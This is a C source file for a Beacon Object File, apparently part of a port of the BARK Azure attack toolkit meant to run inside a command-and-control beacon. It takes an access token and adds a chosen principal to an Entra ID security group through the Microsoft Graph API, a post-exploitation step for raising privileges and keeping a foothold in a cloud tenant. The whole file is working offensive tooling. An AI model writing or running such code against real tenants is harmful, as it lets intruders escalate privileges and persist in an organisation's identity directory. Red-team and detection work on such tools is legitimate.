/*
 * add_member_to_entra_group.c — BARK BOF
 * Add-MemberToEntraGroup — Add a principal to an Entra security group
 *
 * Args : token, principalId, targetGroupId
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    char   pathBuf[512], bodyBuf[512];
    LPWSTR widePath = NULL;
    char  *token = NULL, *principalId = NULL, *targetGroupId = NULL;

    BeaconDataParse(&parser, args, alen);
    token         = BeaconDataExtract(&parser, NULL);
    principalId   = BeaconDataExtract(&parser, NULL);
    targetGroupId = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_add_member_to_entra_group <token> <principalId> <groupId>\n");
        return;
    }

    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"@odata.id\":\"https://graph.microsoft.com/v1.0/directoryObjects/%s\"}",
        principalId);

    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "/v1.0/groups/%s/members/$ref", targetGroupId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Add-MemberToEntraGroup: adding %s to %s\n",
        principalId, targetGroupId);
    BarkPost(L"graph.microsoft.com", widePath, L"POST", bodyBuf, token, "application/json");
    HFree(widePath);
}
